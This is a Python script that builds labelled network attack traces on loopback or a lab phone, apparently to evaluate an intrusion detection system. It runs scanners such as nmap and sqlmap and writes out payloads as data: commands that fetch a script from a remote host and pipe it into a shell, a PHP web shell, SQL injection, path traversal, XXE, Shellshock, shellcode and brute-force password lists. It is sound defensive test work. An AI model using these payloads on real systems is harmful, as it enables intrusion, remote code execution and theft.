#!/usr/bin/env python3
"""Generates the development set: labelled attack traces whose ground truth is known by construction.

Three provenance classes, recorded in traces/dev/manifest.json and reported in the paper:
  tool     the real attack tool ran and tshark captured what it sent
  socket   real sockets speak the attack protocol to a local endpoint, captured by tshark
  crafted  frames written directly with scapy, for packets a desktop socket cannot emit

Every target is this laptop's loopback interface or the phone named by --phone.
"""
import argparse
import base64
import http.client
import json
import os
import pathlib
import random
import socket
import subprocess
import sys
import time
import urllib.parse

sys.path.insert(0, str(pathlib.Path(__file__).parent))
import lab_servers as lab  # noqa: E402

EVAL = pathlib.Path(__file__).resolve().parents[1]
OUT = EVAL / "traces/dev"
TOOLS = EVAL / "tools"
TSHARK = r"C:\Program Files\Wireshark\tshark.exe"
LOOPBACK = r"\Device\NPF_Loopback"
PERL = r"C:\msys64\usr\bin\perl.exe"
MANIFEST = {}
random.seed(20261102)


class Capture:
    def __init__(self, name, iface, bpf):
        self.path = OUT / f"{name}.pcap"
        self.proc = subprocess.Popen([TSHARK, "-q", "-i", iface, "-f", bpf, "-F", "pcap", "-w", str(self.path)],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)

    def __enter__(self):
        time.sleep(4.0)
        return self

    def __exit__(self, *exc):
        time.sleep(1.5)
        self.proc.terminate()
        try:
            self.proc.wait(10)
        except subprocess.TimeoutExpired:
            self.proc.kill()


def record(name, cls, provenance, tool, expected):
    size = (OUT / f"{name}.pcap").stat().st_size
    MANIFEST[name] = {"class": cls, "provenance": provenance, "tool": tool, "expected": expected, "bytes": size}
    print(f"  {name}: {size} bytes", flush=True)


def tool_nmap():
    return str(next((TOOLS / "nmap").rglob("nmap.exe")))


def wifi_iface_for(ip):
    # tshark names Windows adapters by GUID; ask PowerShell which adapter holds this address
    ps = f"(Get-NetIPAddress -IPAddress {ip}).InterfaceAlias"
    alias = subprocess.check_output(["powershell", "-NoProfile", "-Command", ps]).decode().strip()
    listing = subprocess.check_output([TSHARK, "-D"]).decode(errors="replace")
    for line in listing.splitlines():
        if f"({alias})" in line:
            return line.split(" ", 1)[1].split(" (")[0]
    raise SystemExit(f"no tshark interface for {alias}")


def nmap_scans(phone, local_ip):
    iface = wifi_iface_for(local_ip)
    nmap = tool_nmap()
    scans = {
        "atk_nmap_connect": (["-sT"], "port_scan"),
        "atk_nmap_syn": (["-sS"], "port_scan"),
        "atk_nmap_fin": (["-sF"], "port_scan"),
        "atk_nmap_null": (["-sN"], "port_scan"),
        "atk_nmap_xmas": (["-sX"], "port_scan"),
        "atk_nmap_synfin": (["--scanflags", "SYNFIN"], "malformed_tcp"),
    }
    for name, (flags, cls) in scans.items():
        with Capture(name, iface, f"host {phone}"):
            subprocess.run([nmap, *flags, "-Pn", "-n", "-p1-300", "-T4", "--max-retries", "0", "-S", local_ip, "-e", "wlan0", phone],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
        if (OUT / f"{name}.pcap").stat().st_size < 4000:
            with Capture(name, iface, f"host {phone}"):
                subprocess.run([nmap, *flags, "-Pn", "-n", "-p1-300", "-T4", "--max-retries", "0", phone],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
        record(name, cls, "tool", "nmap 7.92 " + " ".join(flags), ["L1:PORT_SCAN", "RULE-001", "L1:MALFORMED_PACKET"])


def nmap_http(port):
    name = "atk_nmap_nse_http"
    with Capture(name, LOOPBACK, f"tcp port {port}"):
        subprocess.run([tool_nmap(), "-sT", "-Pn", "-n", "-p", str(port), "--script",
                        "http-enum,http-shellshock,http-sql-injection,http-title,http-useragent-tester",
                        "--script-args", "http-shellshock.uri=/item.php", "--script-timeout", "60s", "127.0.0.1"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=180)
    record(name, "http_scanner", "tool", "nmap 7.92 NSE", ["RECON-001", "RULE-009", "NET-002", "EXP-001", "RULE-002"])


def nikto(port):
    # The lab machine's antivirus blocks nikto.pl, so this replays Nikto's documented request
    # shape over a socket instead of running the tool. It is labelled as such in the manifest.
    name = "atk_nikto_scan"
    ua = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:%06d)"
    paths = ["/", "/admin/", "/phpmyadmin/", "/cgi-bin/test-cgi", "/.git/config", "/server-status", "/backup.tar.gz",
             "/index.php?page=../../../../etc/passwd", "/wp-login.php", "/manager/html", "/config.php.bak", "/shell.php"]
    reqs = [("GET", p, {"User-Agent": ua % i, "Accept": "*/*"}, None) for i, p in enumerate(paths * 4)]
    with Capture(name, LOOPBACK, f"tcp port {port}"):
        http_requests(port, reqs, 0.01)
    record(name, "http_scanner", "socket", "Nikto User-Agent and request shape, tool blocked by host antivirus",
           ["RECON-002", "EXP-002", "RULE-009"])


def sqlmap(port):
    name = "atk_sqlmap_scan"
    script = next((TOOLS / "sqlmap").rglob("sqlmap.py"))
    with Capture(name, LOOPBACK, f"tcp port {port}"):
        subprocess.run([sys.executable, script.name, "-u", f"http://127.0.0.1:{port}/item.php?id=1", "--batch", "--level=2",
                        "--risk=1", "--flush-session", "--technique=BEUS", "--time-sec=1", "--threads=2",
                        "--output-dir", str(OUT / "_sqlmap")],
                       cwd=script.parent, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=240)
    record(name, "sql_injection", "tool", "sqlmap", ["RECON-003", "EXP-001", "RULE-002"])


def http_requests(port, reqs, pause=0.02):
    for method, path, headers, body in reqs:
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
        try:
            conn.putrequest(method, path, skip_accept_encoding=True, skip_host=False)
            hdrs = dict(headers)
            if body:
                hdrs.setdefault("Content-Length", str(len(body)))
            for k, v in hdrs.items():
                conn.putheader(k, v)
            conn.endheaders(body if body else None)
            conn.getresponse().read()
        except Exception:
            pass
        finally:
            conn.close()
        time.sleep(pause)


BROWSER = {"User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/130.0 Mobile Safari/537.36", "Accept": "*/*"}


def web_attacks(port):
    q = urllib.parse.quote
    groups = {
        "atk_sqli_manual": ("sql_injection", ["EXP-001", "RULE-002"], [
            ("GET", "/item.php?id=1%27%20OR%20%271%27%3D%271", BROWSER, None),
            ("GET", "/item.php?id=1%20UNION%20SELECT%201,2,3--", BROWSER, None),
            ("GET", "/item.php?id=1'+OR+1=1--", BROWSER, None),
            ("GET", "/login.php?user=admin'--&pass=x", BROWSER, None),
            ("GET", "/item.php?id=1;DROP%20TABLE%20users", BROWSER, None),
            ("POST", "/login.php", {**BROWSER, "Content-Type": "application/x-www-form-urlencoded"}, b"user=admin&pass=' OR '1'='1"),
            ("POST", "/search", {**BROWSER, "Content-Type": "application/x-www-form-urlencoded"}, b"q=x' UNION SELECT username,password FROM users--"),
        ]),
        "atk_traversal": ("path_traversal", ["EXP-002"], [
            ("GET", "/download?file=../../../../etc/passwd", BROWSER, None),
            ("GET", "/download?file=..%2F..%2F..%2Fetc%2Fpasswd", BROWSER, None),
            ("GET", "/download?file=%2e%2e%2f%2e%2e%2fetc%2fshadow", BROWSER, None),
            ("GET", "/static/....//....//windows/win.ini", BROWSER, None),
        ]),
        "atk_rce_http": ("rce", ["EXP-003"], [
            ("GET", "/cgi-bin/ping?host=127.0.0.1;%20wget%20http://198.51.100.9/x.sh", BROWSER, None),
            ("POST", "/cgi-bin/run", {**BROWSER, "Content-Type": "text/plain"}, b"cmd=; wget http://198.51.100.9/x.sh -O- | /bin/sh"),
            ("POST", "/api/exec", {**BROWSER, "Content-Type": "application/json"}, b'{"c":"curl http://198.51.100.9/a | /bin/bash"}'),
            ("POST", "/upload.php", {**BROWSER, "Content-Type": "text/plain"}, b"<?php system($_GET['c']); eval($_POST['e']); ?>"),
        ]),
        "atk_xxe_http": ("xxe", ["EXP-004"], [
            ("POST", "/xml", {**BROWSER, "Content-Type": "application/xml"},
             b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'),
            ("POST", "/soap", {**BROWSER, "Content-Type": "text/xml"},
             b'<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>'),
        ]),
        "atk_shellshock_http": ("shellshock", ["NET-002"], [
            ("GET", "/cgi-bin/status", {"User-Agent": "() { :;}; /bin/bash -c 'cat /etc/passwd'", "Accept": "*/*"}, None),
            ("GET", "/cgi-bin/test.cgi", {"User-Agent": "() { ignored;}; /bin/sleep 2", "Accept": "*/*"}, None),
        ]),
        "atk_malicious_download": ("malicious_download", ["RULE-003"], [
            ("GET", "/updates/invoice.exe", BROWSER, None),
            ("GET", "/updates/patch.scr", BROWSER, None),
            ("GET", "/updates/install.ps1", BROWSER, None),
            ("GET", "/updates/lib.dll", BROWSER, None),
        ]),
        "atk_cobalt_beacon": ("c2_beacon", ["MAL-003"], [
            ("GET", "/activity", {"User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", "Accept": "*/*",
                                  "Cookie": base64.b64encode(os.urandom(128)).decode()}, None) for _ in range(6)
        ]),
        "atk_shellcode_http": ("shellcode", ["RULE-008"], [
            ("POST", "/vuln.cgi", {**BROWSER, "Content-Type": "application/octet-stream"},
             b"\x90" * 64 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"),
            ("POST", "/vuln.cgi", {**BROWSER, "Content-Type": "application/octet-stream"},
             b"A" * 40 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"),
        ]),
    }
    for name, (cls, expected, reqs) in groups.items():
        pause = 2.0 if name == "atk_cobalt_beacon" else 0.05
        with Capture(name, LOOPBACK, f"tcp port {port}"):
            http_requests(port, reqs, pause)
        record(name, cls, "socket", "python http.client", expected)

    name = "atk_exfil_http"
    with Capture(name, LOOPBACK, f"tcp port {port}"):
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
        blob = base64.b64encode(os.urandom(1050))
        for i in range(150):
            conn.request("POST", f"/collect?data={base64.urlsafe_b64encode(os.urandom(90)).decode()}", body=blob,
                         headers={**BROWSER, "Content-Type": "application/octet-stream"})
            conn.getresponse().read()
            time.sleep(0.02)
        conn.close()
    record(name, "exfiltration", "socket", "python http.client", ["EXFIL-001", "RULE-007"])


def line_protocol(name, port, lines, cls, expected, tool, delay=0.05, banner=b"", replies=None, default=b""):
    srv = lab.start_lines(port, banner, replies, default)
    with Capture(name, LOOPBACK, f"tcp port {port}"):
        s = socket.create_connection(("127.0.0.1", port), timeout=5)
        for line in lines:
            s.sendall(line)
            time.sleep(delay)
        s.close()
    srv.shutdown(); srv.server_close()
    record(name, cls, "socket", tool, expected)


def binary_protocols():
    line_protocol("atk_meterpreter_tcp", 4444, [
        b"\x00\x00\x00\x4e\x00\x00\x00\x00core_loadlib\x00ext_server_stdapi.dll\n",
        b"\x00\x00\x00\x20\x00\x00\x00\x00stdapi_sys_config_getuid\x00\n",
        b"\x00\x00\x00\x20\x00\x00\x00\x00stdapi_fs_getwd\x00\n",
        b"\x00\x00\x00\x20\x00\x00\x00\x00meterpreter_session_ready\x00\n",
    ], "meterpreter", ["MAL-001"], "TLV-shaped method names over a raw socket")

    line_protocol("atk_irc_bot", 6667, [
        b"NICK bot%04d\r\n" % random.randint(0, 9999), b"USER b 0 * :b\r\n",
        b"JOIN #cmdchan\r\n", b"PRIVMSG #cmdchan :!ready\r\n", b"PRIVMSG #cmdchan :!ddos 203.0.113.9 80\r\n",
    ], "irc_c2", ["C2-003"], "IRC client commands", banner=b":irc.local NOTICE * :*** Looking up your hostname\r\n",
       replies={b"NICK": b":irc.local 001 bot :Welcome\r\n", b"JOIN": b":bot JOIN #cmdchan\r\n"})

    line_protocol("atk_stratum_xmrig", 3333, [
        b'{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A","pass":"x","agent":"XMRig/6.21.0 (Linux x86_64) libuv/1.44.2 gcc/11.4.0","algo":["rx/0","cn/r"]}}\n',
        b'{"id":2,"jsonrpc":"2.0","method":"submit","params":{"id":"1","job_id":"j1","nonce":"deadbeef","result":"00aa"}}\n',
    ], "cryptomining", ["RULE-006"], "XMRig stratum login format", delay=0.3,
       replies={b"login": b'{"id":1,"jsonrpc":"2.0","error":null,"result":{"id":"1","job":{"blob":"0606","job_id":"j1","target":"f3220000","algo":"rx/0"},"status":"OK"}}\n'})

    line_protocol("atk_stratum_btc", 3333, [
        b'{"id":1,"method":"mining.subscribe","params":["cgminer/4.10.0"]}\n',
        b'{"id":2,"method":"mining.authorize","params":["wallet.worker1","x"]}\n',
        b'{"id":3,"method":"mining.submit","params":["wallet.worker1","j1","00000000","5f5e1000","deadbeef"]}\n',
    ], "cryptomining", ["RULE-006"], "Bitcoin stratum v1 format", delay=0.3,
       replies={b"subscribe": b'{"id":1,"result":[[["mining.notify","ae68"]],"08000002",4],"error":null}\n'})


def ssh_bruteforce():
    import paramiko
    name = "atk_ssh_bruteforce"
    port = lab.try_port(22, 2222)

    class Deny(paramiko.ServerInterface):
        def check_auth_password(self, username, password):
            return paramiko.AUTH_FAILED

        def get_allowed_auths(self, username):
            return "password"

    host_key = paramiko.RSAKey.generate(2048)
    listener = socket.socket()
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("127.0.0.1", port))
    listener.listen(50)

    import threading

    def serve():
        while True:
            try:
                c, _ = listener.accept()
            except OSError:
                return

            def one(conn):
                t = paramiko.Transport(conn)
                t.add_server_key(host_key)
                try:
                    t.start_server(server=Deny())
                    t.accept(10)
                    time.sleep(0.5)
                except Exception:
                    pass
                finally:
                    t.close()
            threading.Thread(target=one, args=(c,), daemon=True).start()

    threading.Thread(target=serve, daemon=True).start()
    passwords = ["123456", "password", "admin", "root", "toor", "qwerty", "letmein", "dragon", "111111", "abc123",
                 "monkey", "master", "shadow", "sunshine", "iloveyou", "trustno1", "welcome", "football", "login", "passw0rd"]
    with Capture(name, LOOPBACK, f"tcp port {port}"):
        for pw in passwords:
            try:
                c = paramiko.SSHClient()
                c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                c.connect("127.0.0.1", port=port, username="root", password=pw, timeout=4, allow_agent=False, look_for_keys=False)
            except Exception:
                pass
            finally:
                c.close()
    listener.close()
    record(name, "ssh_bruteforce", "socket", f"paramiko login attempts on port {port}", ["BRUTE-001", "RULE-005"])


def ftp_bruteforce():
    port = lab.try_port(21, 2121)
    name = "atk_ftp_bruteforce"
    srv = lab.start_lines(port, b"220 FTP ready\r\n", {b"USER": b"331 Password required\r\n", b"PASS": b"530 Login incorrect\r\n"}, b"500 ?\r\n")
    with Capture(name, LOOPBACK, f"tcp port {port}"):
        for i in range(30):
            s = socket.create_connection(("127.0.0.1", port), timeout=3)
            s.recv(200)
            s.sendall(b"USER admin\r\n"); s.recv(200)
            s.sendall(b"PASS pass%03d\r\n" % i); s.recv(200)
            s.sendall(b"QUIT\r\n"); s.close()
            time.sleep(0.05)
    srv.shutdown(); srv.server_close()
    record(name, "ftp_bruteforce", "socket", f"FTP logins on port {port}", ["RULE-005"])


def connection_flood(port):
    name = "atk_connection_flood"
    with Capture(name, LOOPBACK, f"tcp port {port}"):
        end = time.time() + 5
        socks = []
        while time.time() < end:
            for _ in range(25):
                try:
                    s = socket.socket()
                    s.setblocking(False)
                    s.connect_ex(("127.0.0.1", port))
                    socks.append(s)
                except OSError:
                    pass
            time.sleep(0.1)
            while len(socks) > 200:
                socks.pop(0).close()
        for s in socks:
            s.close()
    record(name, "connection_flood", "socket", "non-blocking connect storm", ["L1:CONNECTION_FLOOD", "L1:SYN_FLOOD"])


def crafted():
    from scapy.all import ARP, DNS, DNSQR, DNSRR, Ether, ICMP, IP, Raw, TCP, UDP, wrpcap
    t0 = time.time()
    device, gateway, resolver, server = "192.168.50.10", "192.168.50.1", "192.168.50.53", "203.0.113.80"

    def stamp(pkts, rate):
        for i, p in enumerate(pkts):
            p.time = t0 + i / rate
        return pkts

    pkts = [Ether() / IP(src=f"198.18.{random.randint(0, 255)}.{random.randint(1, 254)}", dst=device) /
            TCP(sport=random.randint(1024, 65535), dport=80, flags="S", seq=random.randint(0, 2 ** 31)) for _ in range(2000)]
    wrpcap(str(OUT / "atk_syn_flood.pcap"), stamp(pkts, 400))
    record("atk_syn_flood", "syn_flood", "crafted", "scapy, spoofed sources at 400 pps", ["L1:SYN_FLOOD"])

    def tunnel(name, rate, n, encode, qtype, tool):
        pkts = []
        for i in range(n):
            q = encode(os.urandom(24)) + ".t.tunnel-lab.example"
            pkts.append(Ether() / IP(src=device, dst=resolver) / UDP(sport=40000 + i % 200, dport=53) / DNS(id=i, rd=1, qd=DNSQR(qname=q, qtype=qtype)))
            pkts.append(Ether() / IP(src=resolver, dst=device) / UDP(sport=53, dport=40000 + i % 200) /
                        DNS(id=i, qr=1, aa=1, qd=DNSQR(qname=q, qtype=qtype), an=DNSRR(rrname=q, type=qtype, rdata=encode(os.urandom(90)), ttl=0)))
        for i, p in enumerate(pkts):
            p.time = t0 + (i // 2) / rate + (i % 2) * 0.01
        wrpcap(str(OUT / f"{name}.pcap"), pkts)
        record(name, "dns_tunnel", "crafted", tool, ["L1:DNS_TUNNELING", "RULE-004"])

    def b32(raw):
        s = base64.b32encode(raw).decode().rstrip("=").lower()
        return ".".join(s[i:i + 40] for i in range(0, len(s), 40))

    tunnel("atk_dns_tunnel_dnscat", 25, 400, lambda r: r.hex(), "TXT", "dnscat2 style hex labels, 25 q/s")
    tunnel("atk_dns_tunnel_iodine", 25, 400, b32, "CNAME", "iodine style base32 labels, 25 q/s")
    tunnel("atk_dns_tunnel_slow", 0.5, 40, lambda r: r.hex(), "TXT", "low-and-slow hex labels, 0.5 q/s")

    pkts = []
    for i in range(300):
        pkts.append(Ether() / IP(src=device, dst=server) / ICMP(type=8, id=7, seq=i) / Raw(os.urandom(512)))
        pkts.append(Ether() / IP(src=server, dst=device) / ICMP(type=0, id=7, seq=i) / Raw(os.urandom(512)))
    wrpcap(str(OUT / "atk_icmp_tunnel.pcap"), stamp(pkts, 40))
    record("atk_icmp_tunnel", "icmp_tunnel", "crafted", "scapy, random 512 B echo payloads, 20 req/s", ["RULE-010", "L1:COVERT_CHANNEL"])

    good, evil = "00:11:22:33:44:55", "66:77:88:99:aa:bb"
    pkts = [Ether(src=good, dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, hwsrc=good, psrc=gateway, hwdst="ff:ff:ff:ff:ff:ff", pdst=device)]
    for i in range(30):
        mac = evil if i % 2 == 0 else good
        pkts.append(Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, hwsrc=mac, psrc=gateway, hwdst="ff:ff:ff:ff:ff:ff", pdst=device))
    wrpcap(str(OUT / "atk_arp_spoof.pcap"), stamp(pkts, 2))
    record("atk_arp_spoof", "arp_spoof", "crafted", "scapy gratuitous ARP flip-flop", ["L1:ARP_SPOOFING"])

    pkts = [Ether() / IP(src=device, dst=resolver) / UDP(sport=41000, dport=53) / DNS(id=1, rd=1, qd=DNSQR(qname="beacon.evil-command-control.net", qtype="A")),
            Ether() / IP(src=resolver, dst=device) / UDP(sport=53, dport=41000) / DNS(id=1, qr=1, qd=DNSQR(qname="beacon.evil-command-control.net", qtype="A"),
                                                                                      an=DNSRR(rrname="beacon.evil-command-control.net", type="A", rdata="198.51.100.1", ttl=60)),
            Ether() / IP(src=device, dst="198.51.100.1") / TCP(sport=41001, dport=443, flags="S"),
            Ether() / IP(src=device, dst="185.220.101.0") / TCP(sport=41002, dport=443, flags="S")]
    wrpcap(str(OUT / "atk_blocklist_hit.pcap"), stamp(pkts, 5))
    record("atk_blocklist_hit", "blocklist", "crafted", "listed domain and addresses", ["C2-001", "C2-002"])


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--phone", default="192.168.1.4")
    ap.add_argument("--local", default="192.168.1.8")
    ap.add_argument("--only", default="")
    args = ap.parse_args()
    OUT.mkdir(parents=True, exist_ok=True)
    manifest_path = OUT / "manifest.json"
    if manifest_path.exists():
        MANIFEST.update(json.loads(manifest_path.read_text()))

    port = lab.try_port(80, 8080)
    print("HTTP port", port, flush=True)
    srv = lab.start_http(port)
    steps = {
        "crafted": crafted,
        "web": lambda: web_attacks(port),
        "binary": binary_protocols,
        "flood": lambda: connection_flood(port),
        "ftp": ftp_bruteforce,
        "ssh": ssh_bruteforce,
        "nmap_http": lambda: nmap_http(port),
        "nikto": lambda: nikto(port),
        "sqlmap": lambda: sqlmap(port),
        "nmap_scans": lambda: nmap_scans(args.phone, args.local),
    }
    for key, fn in steps.items():
        if args.only and key not in args.only.split(","):
            continue
        print("==", key, flush=True)
        try:
            fn()
        except Exception as e:
            print("  FAILED", key, repr(e), flush=True)
        manifest_path.write_text(json.dumps(MANIFEST, indent=1))
    srv.shutdown()
    print("done", len(MANIFEST), "traces")


if __name__ == "__main__":
    main()
